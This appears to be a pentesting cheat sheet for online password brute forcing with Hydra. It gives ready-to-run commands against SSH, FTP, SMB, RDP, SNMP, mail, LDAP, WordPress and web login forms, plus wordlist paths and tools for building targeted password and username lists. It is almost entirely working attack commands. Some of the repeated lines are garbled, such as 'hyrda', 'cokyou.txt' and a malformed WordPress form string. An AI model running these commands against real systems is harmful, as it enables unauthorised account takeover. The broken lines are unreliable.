## Table of Contents

    - [Definitions](#Definitions)
      - [Flags](#Flags)
- [LDAP Brute Forcing](#ldap\brute\forcing)
    - [FLAGS](#FLAGS)
        - [Wordlists #wordlists](#Wordlists\#wordlists)
  - [Basic Auth Brute Force Combinder Wordkusts](#Basic\Auth\Brute\Force\Combinder\Wordkusts)
  - [Basic auth Brute Force User\\Pass Wordlists](#Basic\auth\Brute\Force\User\\Pass\Wordlists)
  - [Login  Form Brute Force - Static User, Password wordlist](#Login\\Form\Brute\Force\-\Static\User,\Password\wordlist)
  - [SSH Brute Force - User/Pass Wordlists](#SSH\Brute\Force\-\User/Pass\Wordlists)
  - [FTP Brute Force - Static User, Pass Wordlists](#FTP\Brute\Force\-\Static\User,\Pass\Wordlists)
    - [Wordlist Manglers](#Wordlist\Manglers)

### Definitions
*Online Brute Force*: Attacking a live application over the network, like HTTP, HTTPs, SSH, FTP and others

#### Flags
`-l ''`: indicates the login name is blank
`-f` stop after finding working
`-v` verbose



```bash
#brute force against snmp
hydra -P password-file.txt -v $ip snmp

#FTP known user and rockyou password list
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp

#SSH Using list of users and passwords
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh

#SSH Using a know password and a username list
hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh


#Hydra POP3 Brute Force
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V


#Hydra SMTP Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V        
#Hydra attack http get 401 login with a dictionary    
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                   
#Hydra attack Windows Remote Desktop with rockyou
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                                
#Hydra brute force SMB user with rockyou:
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                         
#Hydra brute force a Wordpress admin login            
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'  

#SMB Brute Forcing
hydra -L usernames.txt -P passwords.txt $ip smb -V -f 

# LDAP Brute Forcing
hydra -L users.txt -P passwords.txt $ip ldap2 -V -f

#Hydra attack http get 401 login with a dictionary
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                     


#Hydra attack Windows Remote Desktop with rockyou
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                          
#Brute force SMB uyer with rockyou
hyrda -t 1 -V -f -l administrator -P /usr/share/wordlists/cokyou.txt $ip smb

#brute force a wordpress login
hydra -l admin -P ./passwordlists.txt $ip -V http-form-post '/wp-login.php:login=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:SLocation' 

#smb brute forcing
hydra -L usernames.txt  -P passwords.txt $ip smb -V -f sm 

### FLAGS ###
-h: help
-l <login/username>
-L <FILE_PATH> Pass multiple usernames/logins wordlist
-p <password_known>
-P <FILE_PATH> : Use a password lists
-s <PORT>: Use custom Port
-f: Exit as soon as at least one login and a password combination is found
-R: Restore previous session (if crashed/aborted.)
```

##### Wordlists #wordlists
#crackingpassword #hashcracking #wordlists #seclists 
```bash
#default password wordlist
/usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

#Common password lists
/usr/share/wordlists/rockyou.txt

#Common names wordlists
/usr/share/wordlists/seclists/Usernames/Names/names.txt
```

#cupp #wordlistmanglingtools #mangling

|**Command**|**Description**|
|---|---|
|`cupp -i`|Creating Custom Password Wordlist|
|`sed -ri '/^.{,7}$/d' william.txt`|Remove Passwords Shorter Than 8|
|``sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``|Remove Passwords With No Special Chars|
|`sed -ri '/[0-9]+/!d' william.txt`|Remove Passwords With No Numbers|
|`./username-anarchy Bill Gates > bill.txt`|Generate Usernames List|
|`ssh b.gates@SERVER_IP -p PORT`|SSH to Server|
|`ftp 127.0.0.1`|FTP to Server|
|`su - user`|Switch to User|

#bruteforce #httpbasicauth #brutebasicauth
## Basic Auth Brute Force Combinder Wordkusts
```bash
hydra -C wordlists.txt SERV_IP -s PORT http-get /
```

## Basic auth Brute Force User\\Pass Wordlists
```bash
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
```


#loginform #loginformbruteforce #hydra
## Login  Form Brute Force - Static User, Password wordlist
```bash
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

#sshbruteforce 
## SSH Brute Force - User/Pass Wordlists
```bash
hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4
```


## FTP Brute Force - Static User, Pass Wordlists
```bash
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```



### Wordlist Manglers
[digininja/RSMangler: RSMangler will take a wordlist and perform various manipulations on it similar to those done by John the Ripper with a few extras. (github.com)](https://github.com/digininja/RSMangler)
______
[sc0tfree/mentalist: Mentalist is a graphical tool for custom wordlist generation. It utilizes common human paradigms for constructing passwords and can output the full wordlist as well as rules compatible with Hashcat and John the Ripper. (github.com)](https://github.com/sc0tfree/mentalist)
____
[cupp - github. Makes large custom wordlists](https://github.com/Mebus/cupp)


